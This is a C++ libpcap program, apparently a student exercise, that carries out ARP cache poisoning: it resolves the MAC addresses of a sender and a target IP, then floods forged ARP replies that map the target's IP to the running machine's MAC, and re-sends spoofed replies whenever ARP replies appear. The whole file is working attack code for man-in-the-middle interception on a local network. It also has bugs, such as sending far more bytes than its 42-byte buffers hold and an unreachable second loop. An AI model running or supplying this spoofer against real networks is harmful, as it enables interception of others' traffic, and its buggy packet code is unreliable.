#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <iostream>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>

using namespace std;

typedef struct _ether_header{
    uint8_t dmac[6];
    uint8_t smac[6];
    uint16_t type;
}ether_header,*pether_header;

#pragma pack(1)
typedef struct _arp_header{
    uint16_t hd_type;
    uint16_t prot_type;
    uint8_t hd_size;
    uint8_t prot_size;
    uint16_t opcode;
    uint8_t s_mac[6];
    in_addr s_ip;
    uint8_t t_mac[6];
    in_addr t_ip;
}arp_header,*parp_header;

#define ETHERTYPE_ARP  0x0806
#define ETHERTYPE_IP 0x0800
#define HDTYPE_ETH 0x0001
#define MAC_LEN 6
#define IP_LEN 4
#define OP_REQ 0x0001
#define OP_REP 0x0002

void print_mac(uint8_t *p_mac){
    for(int i=0 ; i<MAC_LEN ; i++){
        if(i==5){
            printf("%02x\n",p_mac[i]);
            break;
        }
        printf("%02x:",p_mac[i]);
    }
}

void make_my_mac(char* dev,uint8_t *a_mac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; i++)
            a_mac[i]=s.ifr_addr.sa_data[i];
    }
}

void make_my_ip (char * dev,in_addr *a_ip) {
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, dev);
    if (0 == ioctl(sockfd, SIOCGIFADDR, &ifrq))  {
        //a_ip = a_ip-(char)1;
        sin = (struct sockaddr_in *)&ifrq.ifr_addr;
        memcpy (a_ip, (void*)&sin->sin_addr, sizeof(sin->sin_addr));
    }

}

void usage() {
    printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
    printf("sample: pcap_test wlan0\n");
}

u_char* make_broad_packet(char *dev,char* ip){
    //--------------------------send_arp_(ethert_header)_packet-----------------------

    uint8_t* broadcast_packet = (uint8_t*)malloc(42);
    uint8_t broadcast[]={"\xff\xff\xff\xff\xff\xff"};
    pether_header broad_eth=(pether_header)broadcast_packet;
    memcpy(broad_eth->dmac,broadcast,MAC_LEN);
    make_my_mac(dev,broad_eth->smac);
    broad_eth->type = htons(ETHERTYPE_ARP);

    //---------------------------send_arp_(arp_header)_packet------------------------

    parp_header broad_arp=(parp_header)(broadcast_packet+sizeof (ether_header));
    broad_arp->hd_type = htons(HDTYPE_ETH);
    broad_arp->prot_type = htons(ETHERTYPE_IP);
    broad_arp->hd_size = MAC_LEN;
    broad_arp->prot_size = IP_LEN;
    broad_arp->opcode = htons(OP_REQ);
    make_my_mac(dev,broad_arp->s_mac);
    make_my_ip(dev,&(broad_arp->s_ip));
    memset(broad_arp->t_mac,'\x00',MAC_LEN);
    inet_aton(ip,&(broad_arp->t_ip));

    u_char* broad_packet = (u_char*)broadcast_packet;
    return broad_packet;
}

u_char* make_arp_packet(char *dev ,pcap_t* handle ,u_char* packet ,char* sndr_ip ,char* trgt_ip){
    pether_header strd_eth_pack = (pether_header)packet;
    //--------------------------send_arp_(ethert_header)_packet-----------------------
    uint8_t* arp_packet = (uint8_t*)malloc(42);
    pether_header snd_arp_eth=(pether_header)arp_packet;
    memcpy(snd_arp_eth->dmac,strd_eth_pack->smac,MAC_LEN);
    make_my_mac(dev,snd_arp_eth->smac);
    snd_arp_eth->type = htons(ETHERTYPE_ARP);

    parp_header strd_arp_pack = (parp_header)(packet+sizeof (ether_header));
    //---------------------------send_arp_(arp_header)_packet------------------------
    parp_header snd_arp_arp = (parp_header)(arp_packet+sizeof (ether_header));
    snd_arp_arp->hd_type = htons(HDTYPE_ETH);
    snd_arp_arp->prot_type = htons(ETHERTYPE_IP);
    snd_arp_arp->hd_size = MAC_LEN;
    snd_arp_arp->prot_size = IP_LEN;
    snd_arp_arp->opcode = htons(OP_REP);
    make_my_mac(dev,snd_arp_arp->s_mac);
    inet_aton(trgt_ip,&(snd_arp_arp->s_ip));
    memcpy(snd_arp_arp->t_mac,strd_arp_pack->s_mac,MAC_LEN);
    inet_aton(sndr_ip,&(snd_arp_arp->t_ip));

    u_char* parp_packet = (u_char*)arp_packet;
    return parp_packet;
}

u_char* send_check_packet(pcap_t* handle,u_char* pack){
    u_char* r_pack = (u_char*)malloc(42);
    while(1){
        pcap_sendpacket(handle,pack,PCAP_ERRBUF_SIZE);
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res == 0) continue;
        if (res == -1 || res == -2) break;

        pether_header eth = (pether_header)packet;
        uint16_t eth_type = ntohs(eth->type);
        if(eth_type == ETHERTYPE_ARP){
            parp_header broad_arph = (parp_header)(pack+sizeof (ether_header));
            parp_header arph = (parp_header)(packet+sizeof (ether_header));
            uint16_t op = htons(arph->opcode);
            if( (op == OP_REP ) && (broad_arph->t_ip.s_addr == arph->s_ip.s_addr) && (arph->t_ip.s_addr == broad_arph->s_ip.s_addr )){
                r_pack = (u_char*)packet;
                break;
            }
        }
    }

    return r_pack;
}

int main(int argc, char* argv[]) {

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    u_char* b_s_pack,*b_t_pack;             // b = broadcast  |  s = sender | t = target
    u_char* strd_s_pack,*strd_t_pack;
    u_char* sarp_s_pack,*sarp_t_pack;

    b_s_pack=make_broad_packet(dev,argv[2]);
    b_t_pack=make_broad_packet(dev,argv[3]);

    strd_s_pack=send_check_packet(handle,b_s_pack);
    strd_t_pack=send_check_packet(handle,b_t_pack);

    free(b_s_pack);
    free(b_t_pack);

    sarp_s_pack=make_arp_packet(dev,handle,strd_s_pack,argv[2],argv[3]);
    sarp_t_pack=make_arp_packet(dev,handle,strd_t_pack,argv[3],argv[2]);

    pether_header teth = (pether_header)sarp_s_pack;
    print_mac(teth->smac);
    print_mac(teth->dmac);
    while(1){
        if(pcap_sendpacket(handle,sarp_s_pack,PCAP_ERRBUF_SIZE) == 0);
            printf("succes\n");
    }

    while(1){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        pether_header eth = (pether_header)packet;
        uint16_t eth_type = ntohs(eth->type);

        if(eth_type == ETHERTYPE_ARP ){
            parp_header arph = (parp_header)(packet+sizeof (ether_header));
            uint16_t op=ntohs(arph->opcode);
            if( (op==OP_REP) || ( &(arph->t_ip) == &(arph->s_ip) ) ){       //change arph->t_ip !!!!!!
                cout << "-----------------------send_arp_packet------------------" << endl;
                uint8_t send_ak_packet[42]={0,};
                pether_header eth_sap = (pether_header)send_ak_packet;
                memcpy(eth_sap->dmac,arph->s_mac,MAC_LEN);
                make_my_mac(dev,eth_sap->smac);
                eth_sap->type = htons(ETHERTYPE_ARP);

                parp_header arp_sap=(parp_header)(send_ak_packet+sizeof (ether_header));
                arp_sap->hd_type = htons(HDTYPE_ETH);
                arp_sap->prot_type = htons(ETHERTYPE_IP);
                arp_sap->hd_size = MAC_LEN;
                arp_sap->prot_size = IP_LEN;
                arp_sap->opcode = htons(OP_REP);
                make_my_mac(dev,arp_sap->s_mac);
                inet_aton(argv[3],&(arp_sap->s_ip));
                memcpy(arp_sap->t_mac,arph->s_mac,MAC_LEN);
                inet_aton(argv[2],&(arp_sap->t_ip));


                u_char* arp_sap_pack = send_ak_packet;
                if(pcap_sendpacket(handle,arp_sap_pack,PCAP_ERRBUF_SIZE) == 0)
                    cout << "succes!!!" << endl;
            }

        }
    }



    pcap_close(handle);
    return 0;

}
